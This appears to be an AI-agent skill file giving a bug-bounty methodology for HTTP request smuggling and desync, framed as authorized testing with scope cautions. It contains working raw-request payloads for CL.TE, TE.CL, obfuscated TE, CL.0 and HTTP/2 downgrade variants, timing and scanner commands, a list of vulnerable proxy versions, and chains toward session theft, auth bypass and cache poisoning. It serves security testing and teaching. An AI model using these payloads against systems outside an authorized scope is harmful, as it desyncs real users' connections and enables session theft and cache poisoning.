---
name: hunt-http-smuggling
description: "Hunt HTTP request smuggling / desync — CL.TE, TE.CL, obfuscated TE.TE, CL.0, and HTTP/2 desync (H2.CL, H2.TE, H2.0). Cause: a front-end (CDN/proxy/LB, or an HTTP/2 front-end downgrading to an HTTP/1.1 origin) and the back-end disagree on request boundaries — Content-Length vs Transfer-Encoding vs H2 frame length. Reliable detection primitive is a time-delay differential: a malformed length hangs the socket-partner hop while the control request returns instantly. Tooling: smuggler.py, h2csmuggler, Burp HTTP Request Smuggler + Turbo Intruder single-packet. Validate by landing the smuggled effect on a DIFFERENT client's request (socket poisoning), not just your own follow-up — chains to cache poisoning, session/credential theft, and WAF/auth bypass. Grounded in PortSwigger (James Kettle) research + CVE-2021-40346 (HAProxy). Use when testing CDN/LB/WAF + origin stacks on paid programs."
sources: portswigger_research, hackerone_public, cve
---

# HUNT-HTTP-SMUGGLING — HTTP Request Smuggling & Desync

> Authorized-engagement methodology. Every probe here is run **only** against
> assets in an accepted program scope, from a documented test account and egress.
> Request smuggling poisons a *shared socket* between two hops — a careless probe
> can desync a connection for real users, so throttle hard, prefer a dedicated
> non-production host when the program offers one, and stop the moment you have
> the timing/socket proof you need. Lowest dup rate of the web classes,
> $5K–$30K+ on CDN+origin stacks. Core research: PortSwigger, James Kettle.

---

## Validation & False-Positives (Gate 0)

Request smuggling is the class most often *claimed* on the strength of a single
weird status code. A 4xx, a 400, a "connection reset", or a timing wobble in
**your own** browser is **not** smuggling. Do not open a report until every box
below is checked.

1. **What can the attacker DO right now?**
   You must demonstrate a **desynchronized socket**: a request you craft causes a
   subsequent request — issued over the same front-end↔back-end connection — to be
   mis-parsed. The gold-standard proof is a **time-delay differential** (below):
   the attack request hangs while an identical control request returns instantly,
   because one hop is blocked waiting for bytes that will never arrive.

2. **Does the effect cross a trust boundary to ANOTHER client?**
   The smuggled bytes must affect a request from a **different client/session** —
   the next victim on that pooled connection. If the only thing you can show is a
   response to *your own* follow-up request, that is parser disagreement on a
   connection **you** own, not exploitable smuggling. Prove cross-client impact via
   the **socket-poisoning** primitive (below) or an OOB callback (`interactsh-client`
   is the UBH-registered OOB listener; a Burp Collaborator domain works too).

3. **Is it a real desync, not just a rejected request?**
   Rule out the two classic false positives:
   - **Front-end rejects it (400/501):** if the *first* hop 400s the malformed
     request, nothing reaches the back-end — no desync. RFC 9112-strict proxies
     (Nginx ≥ 1.21, Caddy, Envoy) do exactly this. See the suitability matrix.
   - **Back-end closes the connection:** a `Connection: close` or a reset that only
     tears down *your* socket is not victim-affecting. You need the socket to stay
     pooled and poison the *next* request on it.

4. **Can it be reproduced in 10 minutes?**
   Send the desync probe → observe the timing differential → send a benign
   "normal" request that comes back with your smuggled prefix (or a captured
   victim artifact). If you cannot re-drive it cleanly, the pool may have recycled
   and the finding is not report-ready.

> A timing delta in **your own** connection alone, a lone 4xx, or a reflected
> string is Gate-0 FAIL. Demote to informational.

---

## The Detection Primitive — Time-Delay Differential

This is the single most reliable, program-safe way to confirm a desync **before**
attempting any victim-affecting exploitation. It works because a length header
that overstates the body makes the receiving hop block on `read()`, waiting for
bytes that never come — until its timeout fires.

**CL.TE time-delay probe** (front-end honors `Content-Length`, back-end honors
`Transfer-Encoding`). The back-end sees the `0\r\n\r\n` chunk terminator, then
blocks waiting for the "next request" whose start line is `G` + more:

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

- **Vulnerable (CL.TE):** front-end forwards all 4 CL bytes; back-end reads the
  `1\r\nA\r\n` chunk, then hangs waiting for the next chunk-size line → **~10–30s
  delay** governed by the back-end read timeout.
- **Safe:** returns instantly (both hops agree) or the front-end 400s it.

**TE.CL time-delay probe** (front-end honors `Transfer-Encoding`, back-end honors
`Content-Length`):

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

- **Vulnerable (TE.CL):** front-end reads to the `0\r\n\r\n` and forwards the
  whole thing; back-end trusts `Content-Length: 6` and blocks waiting for 6 bytes
  → **delay**.

**Differential discipline (mandatory):** always send the **matched control** —
the same request with a *consistent* length — and record both round-trip times.
A finding is the **delta** (attack hangs, control is instant), never an absolute
number. Network jitter alone produces false hangs; the paired control kills that.

```bash
# Illustrative raw-socket timing. Do NOT use curl for the desync frames — curl
# normalizes CL/TE and won't send a malformed pair. openssl s_client sends bytes
# verbatim. Time the attack frame vs. an identical well-formed control.
time ( printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX' \
  | openssl s_client -quiet -connect TARGET:443 2>/dev/null )
```

---

## Socket-Poisoning Confirmation (cross-client proof)

Once the timing differential confirms a desync, prove **victim impact** without
waiting for a real user: open **two** connections to the front-end. On connection
A, send an attack request that leaves a smuggled prefix in the back-end's buffer.
On connection B (or a re-used pooled connection), send a benign request — if it
comes back with **your smuggled prefix prepended** (e.g. a `404` for a path only
your prefix contained, or your header reflected into B's response), the socket is
poisoned across requests. In Burp, the **HTTP Request Smuggler** extension's
"confirm" step and **Turbo Intruder** automate the A/B pairing.

> Program-safety: poison your **own** second request first. Only escalate to
> capturing a genuine third-party artifact when scope explicitly allows it, and
> stop at the first captured proof.

---

## Full Variant Catalog with Payloads

Fingerprint the stack **first** (see suitability matrix) — the classic CL/TE
variants are dead on RFC-9112-strict front-ends, and the H2 family is the modern
dominant vector on CDN+origin topologies.

### CL.TE — Content-Length (front) / Transfer-Encoding (back)

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Front-end forwards 6 bytes (`0\r\n\r\nG`); back-end stops at the chunk terminator
and treats the trailing `G` as the start of the **next** request → the next
victim's request gets `G` prepended to its method (`GPOST …`).

### TE.CL — Transfer-Encoding (front) / Content-Length (back)

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0

```

Front-end chunk-parses and forwards the whole body; back-end reads only the first
4 bytes per its `Content-Length`, leaving the smuggled `GPOST …` in the buffer.

### TE.TE — obfuscated Transfer-Encoding (one hop ignores a mangled TE header)

Both hops "support" TE, but you obfuscate the header so **one** hop fails to
recognize it and falls back to `Content-Length`. Rotate these obfuscations
(PortSwigger's canonical set):

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding:chunked            (no space)
Transfer-Encoding: chunked\r\n Transfer-Encoding: x   (duplicate, second bogus)
Transfer-Encoding:\tchunked          (tab)
X: X\nTransfer-Encoding: chunked     (folded / LF-only prefix)
Transfer-Encoding\n: chunked
```

Combine with a CL.TE or TE.CL body depending on which hop you tricked into
ignoring TE.

### CL.0 — back-end ignores the body entirely (treats CL as 0)

Some back-ends (certain servers behind reverse proxies) ignore the request body
on specific endpoints (static files, redirects, some GET-only handlers), so the
front-end's `Content-Length` bytes become a smuggled prefix. Probe endpoints that
"shouldn't" have a body:

```http
POST /static/asset.js HTTP/1.1
Host: TARGET
Content-Length: 41
Connection: keep-alive

GET /admin HTTP/1.1
X-Ignore: X
```

If the back-end ignores the POST body, `GET /admin …` becomes the next request on
the pooled socket. (Client-side variant: CL.0 is also the basis for browser-driven
client-side desync — see note below.)

### H2.CL — HTTP/2 front-end, injected Content-Length, HTTP/1.1 back-end

The front-end speaks HTTP/2 to you and downgrades to HTTP/1.1 to origin. HTTP/2
carries its own frame lengths, so a **user-supplied `content-length`** header
should be ignored — but if the downgrade blindly copies it into the HTTP/1.1
request, the back-end mis-frames. Send (via an HTTP/2 client, e.g. Burp) an H2
request with an explicit, *wrong* `content-length`:

```
:method   POST
:path     /
:authority TARGET
content-length  0        <-- lies; real H2 body follows

GET /admin HTTP/1.1
Host: TARGET
Foo: x
```

Downgrade emits `Content-Length: 0`, so the back-end treats the H2 body as a new
request → smuggled `GET /admin`.

### H2.TE — HTTP/2 front-end, injected Transfer-Encoding

Inject a `transfer-encoding: chunked` header into the H2 request. A correct
downgrade must strip it; a buggy one forwards it, and the HTTP/1.1 back-end
chunk-parses:

```
:method   POST
:path     /
:authority TARGET
transfer-encoding  chunked

0

GET /admin HTTP/1.1
Host: TARGET
Foo: x
```

### H2.0 / H2 desync — HTTP/2 request splitting via CRLF / header-name injection

Where the front-end doesn't validate HTTP/2 header names/values, inject `\r\n`
into a header **name** or **value** (or the `:path`) to smuggle a full second
request line during downgrade. This is Kettle's "HTTP/2 request splitting" —
the H2 layer looks clean, but the downgraded HTTP/1.1 stream contains two
requests:

```
:method   GET
:path     /
:authority TARGET
foo       bar\r\nHost: TARGET\r\n\r\nGET /admin HTTP/1.1\r\nX: x
```

### Client-side desync (CSD) note

Not all desync needs a shared back-end socket. **Client-side desync** poisons the
*victim's own browser connection*: a CL.0-style front-end that ignores a body on
a specific endpoint lets attacker JavaScript (`fetch` with `keep-alive`) leave a
prefix in the browser's connection, so the victim's *next* same-origin request is
captured/redirected. This turns an on-site XSS-adjacent primitive into full
request hijack **without** any server-side desync. Confirm it with a browser +
the victim's own connection, not a raw socket. (PortSwigger "Browser-Powered
Desync Attacks", Kettle 2022.)

---

## Operator Tooling

Standard external operator tools (not UBH first-party scripts). Use these for the
mechanical framing/timing so you are not hand-hex-editing chunk sizes:

```bash
# smuggler.py — sweeps CL.TE / TE.CL / TE.TE obfuscations with timing checks
python3 smuggler.py -u https://TARGET/ --timeout 10

# h2csmuggler — HTTP/2-cleartext (h2c) upgrade smuggling past a front-end proxy
python3 h2csmuggler.py -x https://TARGET/ https://TARGET/admin
```

- **Burp HTTP Request Smuggler** (extension): right-click request → *Smuggle
  probe* runs the CL.TE/TE.CL/TE.TE + H2 matrix with built-in timing and a
  **confirm** step that does the A/B socket-poisoning pairing for you.
- **Burp Turbo Intruder — single-packet / last-byte-sync:** the reliable way to
  send the desync frames with precise byte control and to race the A/B connections.
  Also the engine for HTTP/2 request splitting where a normal client would
  normalize your CRLFs away.
- **`interactsh-client`** (UBH-registered, `tools/external_arsenal.sh`): OOB
  listener for blind confirmation when a smuggled request forces the front-end to
  make an outbound callback.

> Do **not** use `curl` or plain sockets to *frame* the H2 variants — they will
> normalize CL/TE or won't speak raw HTTP/2 frames. Use an HTTP/2-native client
> (Burp Pro, or `h2csmuggler` for the h2c case). `openssl s_client` is fine for
> the HTTP/1.1 CL/TE timing probes above.

---

## Target-Suitability Matrix (2026 reality check)

The classic CL.TE / TE.CL payloads are NOT universally exploitable in 2026. Modern
proxies are RFC 9112 strict by default. Fingerprint the front-end BEFORE investing
time.

| Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
|---|---|---|---|---|---|
| **Nginx ≥ 1.21** | NO | NO | partial (H2 ingress) | partial | RFC-strict; rejects CL+TE with HTTP 400. Verified locally on Nginx 1.27 — all 9 documented variants killed by front-end ([docs/verification/phase2h-smuggling-cachepoison.md](../../docs/verification/phase2h-smuggling-cachepoison.md)). |
| **Caddy 2.x** | NO | NO | — | — | Hardened by default |
| **Envoy ≥ 1.20** | NO | NO | partial | partial | Hardened in most paths |
| **HAProxy ≤ 2.4** | ✓ | ✓ | — | — | **Vulnerable**, see CVE-2021-40346 |
| **AWS ALB + specific upstream** | partial | partial | ✓ | ✓ | Several disclosed-paid reports 2022-2024 |
| **Cloudflare → S3 / Lambda chains** | — | — | ✓ | ✓ | H2-downgrade attacks remain viable |
| **Older F5 BIG-IP (TMM < 16)** | ✓ | — | — | — | Vendor advisories |
| **Citrix ADC / NetScaler (older firmware)** | ✓ | ✓ | — | — | Disclosed in 2020-2022 |
| **Squid 3.x** | ✓ | — | — | — | Older deployments |
| **Apache Traffic Server (older)** | ✓ | ✓ | ✓ | ✓ | PortSwigger research |
| **Custom Python / Go proxies** | ✓ | ✓ | — | — | Frequently miss RFC enforcement |

### Operator fingerprint quick-check

```bash
curl -sI https://TARGET/ | grep -i "Server:"
```

- `nginx/1.21+`, `Caddy`, `envoy` → CL/TE classic is dead — pivot to H2.CL/H2.TE
  if the front-end speaks HTTP/2, or look for legacy proxies upstream
- `HAProxy`, header points to AWS/CDN → run the full payload matrix
- No Server header → assume hardened, but run a single quick `space-before-colon`
  (TE.TE) timing probe; if it doesn't 400, dig deeper

### H2.CL / H2.TE / H2.0 (the modern dominant vector)

H2-downgrade smuggling relies on the front-end speaking HTTP/2 to the client and
HTTP/1.1 to origin. The downgrade re-introduces CL/TE/CRLF confusion because
HTTP/2's frame-length framing and header-name rules don't survive the conversion
cleanly. Most CDN+origin chains in 2024-2026 use this exact topology, so H2.CL /
H2.TE / H2.0 are where the paid bugs live. Send raw HTTP/2 frames (Burp Pro's
HTTP Request Smuggler + Turbo Intruder, `h2csmuggler` for the h2c case) — never an
HTTP/1.1-only client against an H2 front-end.

---

## Grounded Disclosed Reports & Research References

Cite the real technique source in every report — never a fabricated CVE/H1 ID.

1. **CVE-2021-40346 — HAProxy integer-overflow TE.CL smuggling.** A crafted
   header length wraps HAProxy's parser so it drops a header, desyncing front-end
   and back-end and allowing a smuggled request past HAProxy's checks. Fixed in
   HAProxy 2.0.25 / 2.2.17 / 2.3.14 / 2.4.4. The canonical "modern proxy is still
   vulnerable" case — see the suitability matrix row.

2. **PortSwigger Research — "HTTP Desync Attacks: Request Smuggling Reborn",
   James Kettle (2019)** (`portswigger.net/research/http-desync-attacks`). Defines
   the CL.TE / TE.CL / TE.TE families and the **time-delay differential**
   detection primitive this skill's Gate-0 requires. PortSwigger Top-10 Web
   Hacking Technique of 2019 (#1).

3. **PortSwigger Research — "HTTP/2: The Sequel is Always Worse", James Kettle
   (2021)** (`portswigger.net/research/http2`). Defines **H2.CL / H2.TE**
   downgrade smuggling and **HTTP/2 request splitting (H2.0)** via CRLF injection
   in H2 header names/values — the vectors that keep smuggling alive on
   CDN+origin stacks. Includes disclosed cases against Netflix, Verisign and
   major CDNs. PortSwigger Top-10 Web Hacking Technique of 2021 (#1).

4. **PortSwigger Research — "Browser-Powered Desync Attacks", James Kettle
   (2022)** (`portswigger.net/research/browser-powered-desync-attacks`). Introduces
   **client-side desync (CSD)** and the **CL.0** primitive — request hijacking that
   works from the victim's own browser with no shared back-end socket. Basis for
   the client-side-desync note above.

5. **HackerOne / disclosed — U.S. Dept of Defense request smuggling via desync**
   ([H1 #649533](https://hackerone.com/reports/649533)). Real coordinated-disclosure
   case applying Kettle's 2019 timing methodology to a live target; useful as a
   report-structure template (timing proof → socket-poisoning proof → impact).

---

## Related Skills & Chains

Cross-links only — see the named skill for the full mechanics; not duplicated here.

- **`hunt-cache-poison`** — Smuggling + cache is the canonical Critical chain: one
  smuggled request becomes the *stored cached response* for every subsequent
  victim on that key, and smuggling also delivers poison headers **past** a
  WAF/edge that strips them (its "Bypass Techniques" and Gate-0 cover the cache
  side — do not re-derive). Chain primitive: CL.TE/H2.CL smuggle a request whose
  response body carries attacker HTML/JS → front-end cache stores it under a
  popular URL → de-sync poisoning for the full cache TTL.
- **`hunt-host-header`** — The Host/`X-Forwarded-Host` poison payloads and their
  reflection-vs-cache validation live there; smuggling is the *delivery vehicle*
  when the edge strips those headers. Its Phase-2 cache-poisoning validation and
  "Dual-Host / Host override smuggling" probe are the reference — do not restate.
  Chain primitive: smuggle a request carrying `X-Forwarded-Host: attacker.com`
  directly to the back-end past the front-end that would have stripped it.
- **`hunt-auth-bypass`** — Smuggling reaches internal-only routes the front-end
  WAF/auth-proxy filters. Chain primitive: smuggle `GET /admin/users HTTP/1.1`
  past the edge ACL that blocks external `/admin/*` → back-end trusts it as
  internal → admin data in the response queue.
- **`hunt-idor`** — Smuggling attaches the NEXT user's session cookies to an
  attacker-controlled request path. Chain primitive: smuggle `GET /api/me
  HTTP/1.1` with no cookies → back-end pairs it with the next victim's connection
  cookies → victim's session in the smuggled response.
- **`hunt-xss`** — Smuggling injects an XSS payload into the next victim's response
  stream without ever appearing in a URL parameter. Chain primitive: smuggled body
  reflected into the next queued response → reflected XSS at every visitor, invisible
  to their logs.
- **`security-arsenal`** — Reach for the smuggling payload bank (CL.TE / TE.CL /
  TE.TE obfuscations, CL.0, H2.CL/H2.TE/H2.0 downgrade probes, h2csmuggler and
  smuggler.py one-liners, Burp HTTP Request Smuggler + Turbo Intruder config) and
  the time-delay confirmation template before manual hex-editing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the
  smuggled-request effect MUST land on a request issued by a different
  client/session, not your own follow-up. A timing delta in your own browser alone
  is parser disagreement, not exploitable smuggling.
